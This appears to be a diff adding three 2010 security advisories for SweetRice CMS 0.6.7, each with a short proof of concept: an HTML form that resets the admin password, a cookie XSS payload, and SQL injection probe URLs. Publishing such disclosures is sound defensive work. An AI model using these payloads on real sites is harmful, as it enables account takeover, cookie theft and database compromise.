@@ -1,0 +1,75 @@
+Vulnerability ID: HTB22669
+Reference: http://www.htbridge.ch/advisory/reset_admin_password_in_sweetrice_cms.html
+Product: SweetRice CMS
+Vendor: basic-cms.org ( http://www.basic-cms.org/ ) 
+Vulnerable Version: 0.6.7
+Vendor Notification: 21 October 2010 
+Vulnerability Type: Logic error
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: High 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/as/index.php" scripts to properly sanitize user-supplied input. Attacker can change admin password.
+
+The following PoC is available:
+
+
+<form action="http://[host]/as/index.php?type=password&mod=resetok" method="post">
+<input name="p1" type="hidden" value="123">
+<input name="p2" type="hidden" value="123">
+<input name="email" type="hidden" value="[admin_email]">
+<input value="Login" name="login" type="submit">
+</form>
+
+
+Vulnerability ID: HTB22668
+Reference: http://www.htbridge.ch/advisory/xss_in_sweetrice_cms.html
+Product: SweetRice CMS
+Vendor: basic-cms.org ( http://www.basic-cms.org/ )
+Vulnerable Version: 0.6.7
+Vendor Notification: 21 October 2010
+Vulnerability Type: XSS (Cross Site Scripting)
+Status: Fixed by Vendor
+Risk level: Low
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/as/index.php" scripts to properly sanitize user-supplied input in username variable from cookie. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+The following PoC is available:
+
+
+GET /as/index.php HTTP/1.1
+Cookie: top_height=')%3B"><script>alert('XSS')%3B</script>;
+
+
+Solution: Upgrade to the most recent version
+
+
+
+Vulnerability ID: HTB22667
+Reference: http://www.htbridge.ch/advisory/sql_injection_in_sweetrice_cms.html
+Product: SweetRice CMS
+Vendor: basic-cms.org ( http://www.basic-cms.org/ )
+Vulnerable Version: 0.6.7
+Vendor Notification: 21 October 2010
+Vulnerability Type: SQL Injection
+Status: Fixed by Vendor
+Risk level: High
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/index.php" scripts to properly sanitize user-supplied input.
+Attacker can alter queries to the application SQL database, execute arbitrary queries to the database, compromise the application, access or modify sensitive data, or exploit various vulnerabilities in the underlying SQL database.
+
+Attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+
+http://[host]/index.php?action=attachment&file_name=%27
+http://[host]/index.php?action=show_comment&post=%27
+http://[host]/index.php?action=rssfeed&type=entry&sys-name=%27
+http://[host]/index.php?action=view&sys-name=%27
+
+Solution: Upgrade to the most recent version
+
